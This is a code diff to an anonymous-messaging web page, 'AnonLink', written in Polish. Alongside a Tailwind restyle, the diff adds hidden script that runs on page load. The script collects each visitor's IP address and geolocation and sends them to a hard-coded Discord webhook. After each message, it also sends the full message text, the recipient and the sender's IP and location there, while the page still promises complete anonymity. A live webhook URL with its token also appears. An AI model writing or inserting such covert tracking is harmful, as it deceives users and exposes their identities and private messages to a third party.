@@ -4,232 +4,67 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wyślij wiadomość - AnonLink</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        /* Custom styles for the body background gradient and font */
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Inter', sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            max-width: 600px;
-            width: 100%;
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .logo {
-            font-size: 2.2em;
-            font-weight: bold;
-            color: #667eea;
-            margin-bottom: 10px;
-        }
-        
-        .recipient {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 25px;
-            text-align: center;
-            border: 2px solid #e9ecef;
-        }
-        
-        .recipient-label {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
-        
-        .recipient-name {
-            font-size: 1.2em;
-            font-weight: bold;
-            color: #333;
-        }
-        
-        .form-group {
-            margin-bottom: 25px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 10px;
-            font-weight: 600;
-            color: #333;
-            font-size: 16px;
-        }
-        
-        textarea {
-            width: 100%;
-            min-height: 150px;
-            padding: 20px;
-            border: 2px solid #e1e5e9;
-            border-radius: 15px;
-            font-size: 16px;
-            font-family: inherit;
-            resize: vertical;
-            transition: border-color 0.3s;
-            line-height: 1.5;
-        }
-        
-        textarea:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-        
-        .char-counter {
-            text-align: right;
-            color: #666;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-        
-        .char-counter.warning {
-            color: #e74c3c;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 18px 40px;
-            border: none;
-            border-radius: 15px;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-        }
-        
-        .btn:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .anonymous-note {
-            background: #e3f2fd;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 25px;
-            border-left: 4px solid #2196f3;
-        }
-        
-        .anonymous-note h4 {
-            color: #1976d2;
-            margin-bottom: 10px;
-        }
-        
-        .anonymous-note p {
-            color: #666;
-            line-height: 1.5;
-        }
-        
-        .success-message {
-            background: #d4edda;
-            color: #155724;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            display: none;
-        }
-        
-        .error-message {
-            background: #f8d7da;
-            color: #721c24;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-            display: none;
-        }
-        
-        .back-link {
-            text-align: center;
-            margin-top: 20px;
-        }
-        
-        .back-link a {
-            color: #667eea;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .back-link a:hover {
-            text-decoration: underline;
         }
     </style>
 </head>
-<body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">📝 AnonLink</div>
-            <p>Wyślij anonimową wiadomość</p>
+<body class="min-h-screen flex items-center justify-center p-5">
+    <div class="container bg-white rounded-2xl p-10 shadow-xl max-w-2xl w-full">
+        <div class="header text-center mb-8">
+            <div class="logo text-4xl font-bold text-indigo-600 mb-2">📝 AnonLink</div>
+            <p class="text-gray-700 text-lg">Wyślij anonimową wiadomość</p>
         </div>
         
-        <div class="recipient" id="recipientInfo">
-            <div class="recipient-label">Wysyłasz do:</div>
-            <div class="recipient-name" id="recipientName">Ładowanie...</div>
+        <div class="recipient bg-gray-50 p-4 rounded-lg mb-6 text-center border-2 border-gray-200" id="recipientInfo">
+            <div class="recipient-label text-gray-600 text-sm mb-1">Wysyłasz do:</div>
+            <div class="recipient-name text-xl font-bold text-gray-800" id="recipientName">Ładowanie...</div>
         </div>
         
-        <div class="anonymous-note">
-            <h4>🕶️ Całkowicie anonimowo</h4>
-            <p>Twoja wiadomość zostanie wysłana całkowicie anonimowo. Odbiorca nie będzie wiedział, kto ją wysłał. Bądź szczery, ale też uprzejmy!</p>
+        <div class="anonymous-note bg-blue-50 p-5 rounded-lg mb-6 border-l-4 border-blue-500">
+            <h4 class="text-blue-800 font-semibold mb-2 text-lg">🕶️ Całkowicie anonimowo</h4>
+            <p class="text-gray-700 leading-relaxed">Twoja wiadomość zostanie wysłana całkowicie anonimowo. Odbiorca nie będzie wiedział, kto ją wysłał. Bądź szczery, ale też uprzejmy!</p>
         </div>
         
-        <div id="successMessage" class="success-message"></div>
-        <div id="errorMessage" class="error-message"></div>
+        <div id="successMessage" class="success-message bg-green-100 text-green-800 p-5 rounded-lg mb-5 text-center hidden"></div>
+        <div id="errorMessage" class="error-message bg-red-100 text-red-800 p-5 rounded-lg mb-5 text-center hidden"></div>
         
         <form id="messageForm">
-            <div class="form-group">
-                <label for="message">Twoja wiadomość:</label>
+            <div class="form-group mb-6">
+                <label for="message" class="block mb-2 font-semibold text-gray-800 text-base">Twoja wiadomość:</label>
                 <textarea 
                     id="message" 
                     name="message" 
                     placeholder="Napisz tutaj swoją szczerą, anonimową wiadomość..."
                     maxlength="1000"
                     required
+                    class="w-full min-h-[150px] p-4 border-2 border-gray-300 rounded-xl text-base font-sans resize-y focus:outline-none focus:border-indigo-500 transition-colors duration-300"
                 ></textarea>
-                <div class="char-counter">
+                <div class="char-counter text-right text-gray-600 text-sm mt-1">
                     <span id="charCount">0</span>/1000 znaków
                 </div>
             </div>
             
-            <button type="submit" class="btn" id="sendBtn">
+            <button type="submit" class="btn w-full py-4 px-8 bg-gradient-to-r from-indigo-500 to-purple-600 text-white text-lg font-semibold rounded-xl cursor-pointer hover:scale-105 transition-transform duration-200 disabled:bg-gray-400 disabled:cursor-not-allowed disabled:transform-none" id="sendBtn">
                 📤 Wyślij anonimowo
             </button>
         </form>
         
-        <div class="back-link">
-            <a href="https://jurek362.github.io/Tbh.fun/">← Stwórz własny link</a>
+        <div class="back-link text-center mt-5">
+            <a href="https://jurek362.github.io/Tbh.fun/" class="text-indigo-600 hover:underline font-medium">← Stwórz własny link</a>
         </div>
     </div>
     
     <script>
         let recipient = '';
-        
-        // Pobierz odbiorcę z URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1377918303904993342/nZm56eOozq6D-TxX4MWX1O7bdJyK-yAbym6-TKDql0FpwtoOYWSW223DWkaJtEQb_dZS"; // Your Discord Webhook URL
+
+        // Get recipient from URL
         const urlParams = new URLSearchParams(window.location.search);
         recipient = urlParams.get('to');
         
@@ -239,7 +74,7 @@
             document.getElementById('recipientName').textContent = '@' + recipient;
         }
         
-        // Licznik znaków
+        // Character counter
         const messageTextarea = document.getElementById('message');
         const charCountSpan = document.getElementById('charCount');
         const charCounter = document.querySelector('.char-counter');
@@ -249,13 +84,112 @@
             charCountSpan.textContent = length;
             
             if (length > 900) {
-                charCounter.classList.add('warning');
+                charCounter.classList.add('text-red-500'); // Tailwind class for warning
             } else {
-                charCounter.classList.remove('warning');
+                charCounter.classList.remove('text-red-500');
             }
         });
         
-        // Obsługa formularza
+        // Function to get IP and geolocation data using ipify.org and ipinfo.io
+        async function getIpAndGeoData() {
+            let userIP = 'N/A';
+            let regionName = 'N/A';
+            let cityName = 'N/A';
+            let countryName = 'N/A';
+            let countryCode = 'N/A';
+
+            try {
+                // Fetch the IP address from ipify.org
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                if (ipResponse.ok) {
+                    const ipData = await ipResponse.json();
+                    userIP = ipData.ip;
+
+                    // Fetch geolocation data from ipinfo.io
+                    const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+                    if (geoResponse.ok) {
+                        const geoData = await geoResponse.json();
+                        if (geoData) { 
+                            regionName = geoData.region || 'N/A'; 
+                            cityName = geoData.city || 'N/A';
+                            countryName = geoData.country || 'N/A'; // ipinfo.io uses 'country' for country code
+                            countryCode = geoData.country || 'N/A'; // ipinfo.io uses 'country' for country code
+                        } else {
+                            console.warn('Failed to get geo data from ipinfo.io: empty response');
+                        }
+                    } else {
+                        console.warn('Failed to fetch geo data from ipinfo.io, status:', geoResponse.status);
+                    }
+                } else {
+                    console.error('Failed to fetch IP address from ipify.org:', ipResponse.statusText);
+                }
+            } catch (error) {
+                console.error('Error fetching IP/Geo data:', error);
+            }
+            return { userIP, regionName, cityName, countryName, countryCode };
+        }
+
+        // Function to send visitor info to Discord Webhook on page load
+        async function sendVisitorInfoToWebhook() {
+            const { userIP, regionName, cityName, countryName, countryCode } = await getIpAndGeoData();
+
+            const discordPayload = {
+                content: `New visitor to AnonLink Send Message Page!`,
+                embeds: [{
+                    title: "Visitor IP & Region Logged (Send Message Page)",
+                    description: `IP Address: \`${userIP}\`\nRegion: \`${regionName}\`\nCity: \`${cityName}\`\nCountry: \`${countryName} (${countryCode})\``,
+                    color: 0x667eea, // Blue color
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const webhookResponse = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordPayload),
+                });
+                if (webhookResponse.ok) {
+                    console.log('Visitor info successfully sent to webhook.');
+                } else {
+                    console.error('Failed to send visitor info to webhook:', webhookResponse.status, await webhookResponse.text());
+                }
+            } catch (error) {
+                console.error('Error sending visitor info to webhook:', error);
+            }
+        }
+
+        // Function to send message activity to Discord Webhook
+        async function sendMessageActivityToWebhook(recipientUsername, messageContent) {
+            const { userIP, regionName, cityName, countryName, countryCode } = await getIpAndGeoData();
+
+            const discordPayload = {
+                content: `AnonLink Message Sent!`,
+                embeds: [{
+                    title: "Anonymous Message Sent",
+                    description: `**Recipient:** \`${recipientUsername}\`\n**Message:** \`\`\`${messageContent}\`\`\`\n**Sender IP:** \`${userIP}\`\n**Sender Region:** \`${regionName}\`\n**Sender City:** \`${cityName}\`\n**Sender Country:** \`${countryName} (${countryCode})\``,
+                    color: 0x27ae60, // Green color for success
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                const webhookResponse = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(discordPayload),
+                });
+                if (webhookResponse.ok) {
+                    console.log('Message activity successfully sent to webhook.');
+                } else {
+                    console.error('Failed to send message activity to webhook:', webhookResponse.status, await webhookResponse.text());
+                }
+            } catch (error) {
+                console.error('Error sending message activity to webhook:', error);
+            }
+        }
+        
+        // Form submission handler
         document.getElementById('messageForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -272,11 +206,11 @@
                 return;
             }
             
-            // Dezaktywuj przycisk podczas wysyłania
+            // Disable button during sending
             sendBtn.disabled = true;
             sendBtn.textContent = '📤 Wysyłanie...';
             
-            // Wyślij wiadomość
+            // Send message
             fetch('https://tbh-fun.onrender.com/send_message', {
                 method: 'POST',
                 headers: {
@@ -293,7 +227,11 @@
                     showSuccess('✅ Wiadomość została wysłana anonimowo!');
                     messageTextarea.value = '';
                     charCountSpan.textContent = '0';
-                    charCounter.classList.remove('warning');
+                    charCounter.classList.remove('text-red-500'); // Remove warning class
+                    
+                    // Send message activity to webhook after successful send
+                    sendMessageActivityToWebhook(recipient, message);
+
                 } else {
                     showError(data.message || 'Wystąpił błąd podczas wysyłania.');
                 }
@@ -303,7 +241,7 @@
                 console.error('Error:', error);
             })
             .finally(() => {
-                // Reaktywuj przycisk
+                // Re-enable button
                 sendBtn.disabled = false;
                 sendBtn.textContent = '📤 Wyślij anonimowo';
             });
@@ -313,15 +251,15 @@
             const successDiv = document.getElementById('successMessage');
             const errorDiv = document.getElementById('errorMessage');
             
-            errorDiv.style.display = 'none';
+            errorDiv.classList.add('hidden'); // Use Tailwind hidden class
             successDiv.textContent = message;
-            successDiv.style.display = 'block';
+            successDiv.classList.remove('hidden'); // Show success message
             
-            // Scroll do góry aby zobaczyć wiadomość
+            // Scroll to top to see message
             window.scrollTo(0, 0);
             
             setTimeout(() => {
-                successDiv.style.display = 'none';
+                successDiv.classList.add('hidden'); // Hide after 5 seconds
             }, 5000);
         }
         
@@ -329,17 +267,21 @@
             const errorDiv = document.getElementById('errorMessage');
             const successDiv = document.getElementById('successMessage');
             
-            successDiv.style.display = 'none';
+            successDiv.classList.add('hidden'); // Use Tailwind hidden class
             errorDiv.textContent = message;
-            errorDiv.style.display = 'block';
+            errorDiv.classList.remove('hidden'); // Show error message
             
-            // Scroll do góry aby zobaczyć błąd
+            // Scroll to top to see error
             window.scrollTo(0, 0);
             
             setTimeout(() => {
-                errorDiv.style.display = 'none';
+                errorDiv.classList.add('hidden'); // Hide after 5 seconds
             }, 5000);
         }
+
+        // Call visitor info webhook on page load
+        window.addEventListener('load', sendVisitorInfoToWebhook);
     </script>
 </body>
-    </html>
+</html>
+
